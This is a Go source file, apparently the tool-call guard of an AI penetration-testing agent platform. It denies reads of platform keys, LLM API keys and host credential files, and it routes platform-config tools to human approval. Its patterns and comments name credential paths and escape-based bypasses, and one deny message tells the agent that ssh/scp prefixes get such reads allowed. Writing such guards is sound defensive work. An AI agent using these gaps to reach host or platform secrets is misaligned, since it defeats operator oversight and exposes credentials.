				b.WriteByte('\n')
			}
		}
	}
	return b.String()
}

// hostSystemCredentialHit 判定一次入参文本是否构成"裸读本机系统凭据"：
// 路径命中且命令串【不含】远程指代 → true。
//
// 存在性豁免的取舍（外传形态漏判）在 remoteRefRe 注释里已写明。
// 与 platformCredentialRe 的关系见文件头注释：只有本档吃远程指代豁免，
// 平台凭据档不吃（不对称是有意设计）。
func hostSystemCredentialHit(cmd string) bool {
	if remoteRefRe.MatchString(cmd) {
		return false
	}
	if hostSystemCredentialRe.MatchString(cmd) {
		return true
	}
	// 主机私钥：RE2 无 (?!\.pub)，命中后逐处检查尾缀——全部是 .pub 公钥
	// 则放行（公钥可读不构成凭据泄露），存在任一非 .pub 形态即拦。
	for _, l := range sshHostKeyRe.FindAllStringIndex(cmd, -1) {
		if len(cmd)-l[1] < 4 || !strings.EqualFold(cmd[l[1]:l[1]+4], ".pub") {
			return true
		}
	}
	return false
}

// decodedInputText 对入参做 JSON 深解码取回"逻辑文本"，用于堵住
// \u002fapp\u002fjwt.key、\/app\/jwt.key 这类转义绕过——转义后原始字节里
// 不存在 '/'，字面正则永不命中，而 shell 实际执行的是解码后的命令。
// 非 JSON 对象返回空串，调用方只匹配 raw。字段表对齐 intercept 侧
// normalizeToolInput（工具入参字段名是有限集）。
func decodedInputText(input []byte) string {
	if len(input) == 0 || input[0] != '{' {
		return ""
	}
	var m map[string]any
	if err := json.Unmarshal(input, &m); err != nil {
		return ""
	}
	var b strings.Builder
	for _, k := range []string{"command", "text", "pattern", "file_path", "path", "query", "description", "content", "args"} {
		v, ok := m[k]
		if !ok {
			continue
		}
		switch t := v.(type) {
		case string:
			b.WriteString(t)
			b.WriteByte('\n')
		default:
			if enc, err := json.Marshal(v); err == nil {
				b.Write(enc)
				b.WriteByte('\n')
			}
		}
	}
	return b.String()
}

const (
	msgPlatformAsk = "该工具用于修改平台自身配置（建/改自定义工具、skill、资产库）。" +
		"已转人工确认，确认后即可执行。"
	msgMCPDeny = "MCP 注册属于凭据汇：stdio 会以容器 root 拉起任意二进制，" +
		"http/sse 会把 env 当 HTTP header 对任意地址回放。agent 不得自行开通，" +
		"需要时请由 owner 在管理界面配置。"
	msgSensitiveDeny = "该路径指向 ARTEX 平台自身的签名密钥或进程环境" +
		"（含 LLM API Key / 数据库口令），属于控制面，不是渗透目标资产。已禁止读取。"
	// msgHostCredentialDeny 与平台凭据档分开措辞：agent 需要知道这是
	// "读本机"被拦而不是"读靶机"被拦——靶机战果照拿不误，把 ssh/scp 等
	// 远程指代加进命令即可放行（见 hostSystemCredentialHit）。
	msgHostCredentialDeny = "该命令以裸本地路径读取运行平台所在主机的系统凭据" +
		"（/etc/shadow、/etc/sudoers、/root/.ssh、主机私钥等），属于测试者自身环境，" +
		"不是渗透目标资产。读取【靶机】的同类文件是合法战果——" +
		"请用 ssh/scp/proxychains 等远程目标指代形式执行。已禁止读取。"
)

// shortCircuit 在 applyIntercept 最前面求值。返回非 nil 的 Decision 表示
// 本表命中，应当直接执行该动作，不再走 DB 规则与 judge。
//
// 动作语义：
//
//	deny —— 硬拦，无人工放行路径（平台自身凭据、MCP 注册）
//	ask  —— 转人工审批（改写既有行为/可执行面、删证据库）
//	allow —— 代码常量显式判定放行（低危面，如新建技能文件）
//
// RuleName 一律带 "[代码常量]" 前缀：db.interceptSource 靠它把记录归为
// shortcircuit 来源（跨包约定，见 guard/shortcircuit_source_test.go）。
func shortCircuit(toolName string, input []byte) *intercept.Decision {
	if !ShortCircuitEnabled {
		return nil
	}
	// 必须独立求值而非并入 platformAskTools：deny 无人工放行路径，ask 有 60s 超时兜底，合并即丢一档语义。
	if platformDenyTools[toolName] {
		return &intercept.Decision{
			Action:   "deny",
			RuleName: "[代码常量] MCP 注册属凭据汇",
			Message:  msgMCPDeny,
		}
	}
	// G-01①：平台工具一律 ask
	if platformAskTools[toolName] {
		return &intercept.Decision{
			Action:   "ask",
			RuleName: "[代码常量] 平台工具需人工确认",
			Message:  msgPlatformAsk,
			// ask 类规则默认启用超时（种子规则 timeout_enabled=false
			// 照抄即无限等待）。60s 超时 → deny。
			TimeoutEnabled: true,
			TimeoutSeconds: 60,
			TimeoutAction:  "deny",
		}
	}
	// 低危面：显式放行（仍是代码常量判定，不是漏判）
	if platformAllowTools[toolName] {
		return &intercept.Decision{
			Action:   "allow",
			RuleName: "[代码常量] 平台低危工具放行",
			Message:  "新建技能文件不改变既有行为，按平台策略放行。",
		}
	}
	// G-02①-a：平台凭据/进程环境 deny + host 系统凭据档 deny（缺陷1/缺陷2）。
	//
	// 纯记录类工具（recordOnlyTools）整体豁免这两条正则匹配：它们不落盘、
	// 不执行，"如实记录被拦命令原文"是审计刚需，凭据路径出现在文本里 ≠
	// 读取（实跑缺陷2：record_fact 因证据文本引用 /app/jwt.key 被误伤，
	// agent 被迫改写措辞）。命令执行类照旧全字段匹配。
	if !recordOnlyTools[toolName] {
		// 平台凭据档：raw + JSON 深解码后文本都扫（堵 \u002f 转义绕过——
		// 原始字节里不存在 '/' 时字面正则永不命中，而执行的是解码后的命令）。
		// 【刻意不套远程指代豁免】：与 host 档的不对称是有意设计，理由见
		// 文件头注释——靶机上不存在 /app/jwt.key，"远程读它"只可能是本机。
		decoded := decodedInputText(input)
		// V4-E：heredoc 正文是【数据】不是命令（写结果摘要时正文引用被拦命令
		// 原文，被裸相对名档误伤）——只对 platformConfigBareReadRe 用剥离后的
		// 文本匹配。platformCredentialRe/Loose 维持原文匹配：`bash <<EOF …
		// cat /app/jwt.key … EOF` 的正文是被执行的命令，不能因剥离而放过
		// （不对称理由与残余风险见 stripHeredocBodies 上方注释）。
		// 剥离必须在真文本（JSON 转义还原、换行还原）上做，见 jsonStringValuesText。
		readText := string(input)
		if t, ok := jsonStringValuesText(input); ok {
			readText = t
		}
		// V6-FP2：裸相对名档先剥离 heredoc 正文、再屏蔽 echo/printf/tee 引号
		// 参数（写命令数据），最后才匹配。豁免只叠加在这一档；platformCredential
		// Re/Loose 与 host 档仍按原文匹配（见 maskWriteCommandQuoteArgs 注释）。
		bareScan := func(t string) bool {
			return platformConfigBareReadRe.MatchString(maskWriteCommandQuoteArgs(stripHeredocBodies(t)))
		}
		bareReadHit := bareScan(readText) || (decoded != "" && bareScan(decoded))
		if platformCredentialRe.Match(input) || platformCredentialLooseRe.Match(input) || bareReadHit ||
			(decoded != "" && (platformCredentialRe.MatchString(decoded) || platformCredentialLooseRe.MatchString(decoded))) {
			return &intercept.Decision{
				Action:   "deny",
				RuleName: "[代码常量] 平台凭据/进程环境",
				Message:  msgSensitiveDeny,
			}
		}
		// host 系统凭据档：只扫执行面字段（command/file_path 等），远程
		// 指代豁免——`ssh root@target 'cat /etc/shadow'` 是合法打靶战果。
		if hostSystemCredentialHit(hostScanText(input)) {
			return &intercept.Decision{
				Action:   "deny",
				RuleName: "[代码常量] 本机系统凭据裸读",
				Message:  msgHostCredentialDeny,
			}
		}
	}
	return nil
}
